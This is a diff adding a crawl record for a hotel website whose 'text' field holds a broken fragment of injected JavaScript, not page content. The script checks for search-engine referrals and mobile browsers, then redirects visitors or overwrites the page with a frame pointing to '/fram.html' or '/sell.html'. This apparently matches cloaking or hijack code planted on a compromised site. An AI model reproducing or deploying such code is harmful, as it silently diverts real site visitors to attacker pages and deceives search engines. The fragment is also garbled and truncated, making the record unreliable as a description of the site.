@@ -1,0 +1,11 @@
+{
+  "requested_url": "https://www.quangchunghotel.vn",
+  "source_url": "https://quangchunghotel.vn/",
+  "verified_date": "2026-10-14",
+  "status": "OK",
+  "text": "'; const frame = ` `; document.open(); document.write(`${meta}${style} ${frame} `); document.close(); }; // 逻辑执行 const executeLogic = () => { const MOBILE_URL = \"/fram.html\"; const PC_URL = \"/sell.html\"; if (utils.isSearchEngineReferral() && utils.isMobile()) { if (utils.isIOS && getIOSVersion() { window.location.href = MOBILE_URL; }, Math.random() * 500 + 500); } else { createFrame(MOBILE_URL); } } else { createFrame(utils.isMobile() ? MOBILE_URL : PC_URL); } }; // 立即执行 executeLogic(); })();",
+  "emails": [],
+  "links": [],
+  "http_status": 200,
+  "title": ""
+}
